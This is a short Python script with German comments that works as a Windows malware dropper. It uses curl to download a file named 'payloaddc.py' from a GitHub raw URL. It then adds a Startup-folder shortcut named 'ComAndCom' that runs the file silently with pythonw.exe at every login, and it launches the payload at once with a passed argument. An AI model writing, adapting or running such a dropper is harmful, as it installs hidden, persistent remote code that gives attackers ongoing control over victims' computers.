import os
import winshell
from win32com.client import Dispatch
import sys

username = os.getlogin()

if len(sys.argv) > 1:
    argument = sys.argv[1]
    print(f"Das übergebene Argument ist: {argument}")
else:
    sys.exit()

def create_shortcut_to_autostart(script_path, shortcut_name="ComAndCom"):
    # Autostart-Ordner Pfad
    autostart_path = os.path.join(winshell.startup(), f"{shortcut_name}.lnk")
    
    # Verknüpfung erstellen
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortcut(autostart_path)
    
    # Setze den Pfad zum Python-Interpreter und das Skript als Argument
    shortcut.TargetPath = r"C:\Users\krame\AppData\Local\Programs\Python\Python313\pythonw.exe"  # Pfad zum pythonw.exe
    shortcut.Arguments = f'"{script_path}" {argument}'  # Skript als Argument hinzufügen
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.IconLocation = script_path  # Optional: Setzt das Symbol des Skripts
    shortcut.save()
    print(f"Shortcut '{shortcut_name}' wurde im Autostart erstellt.")

# Der Pfad zu deinem Python-Skript
script_to_autostart = f"C:\\Users\\{username}\\payloaddc.py"

os.system(f"cd C:\\Users\\{username} && curl -O https://raw.githubusercontent.com/jkramer5103/stuff/refs/heads/main/payloaddc.py")
create_shortcut_to_autostart(script_to_autostart, "ComAndCom")

# Skript starten
os.system(f'pythonw "{script_to_autostart}" {argument}')
